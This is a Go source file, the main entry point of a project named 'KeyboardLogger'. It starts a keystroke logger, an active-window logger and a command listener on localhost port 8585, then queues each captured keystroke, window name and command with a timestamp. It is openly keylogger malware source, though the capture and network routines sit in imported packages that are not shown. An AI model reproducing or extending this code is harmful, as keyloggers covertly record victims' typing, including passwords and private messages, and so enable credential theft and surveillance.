package main

import (
	"KeyboardLogger/Client/Listener"
	"KeyboardLogger/Utils/NetUtil"
	"time"
)

type Command struct {
	Cmd      string
	DateTime time.Time
}
type Window struct {
	App      string
	DateTime time.Time
}
type Character struct {
	Char     string
	DateTime time.Time
}

func main() {
	key, app, cmd := make(chan string), make(chan string), make(chan string)
	CommandQueue, WindowQueue, CharQueue := make(chan Command, 100), make(chan Window, 500), make(chan Character, 10000)

	go Listener.KeyLogger(key)
	go Listener.AppLogger(app)
	go NetUtil.ListenOnPort("localhost", 8585, cmd)
	for {
		select {
		case res := <-key:
			CharQueue <- Character{
				Char:     res,
				DateTime: time.Now(),
			}
		case res := <-app:
			WindowQueue <- Window{
				App:      res,
				DateTime: time.Now(),
			}
		case res := <-cmd:
			CommandQueue <- Command{
				Cmd:      res,
				DateTime: time.Now(),
			}
		}
	}
}
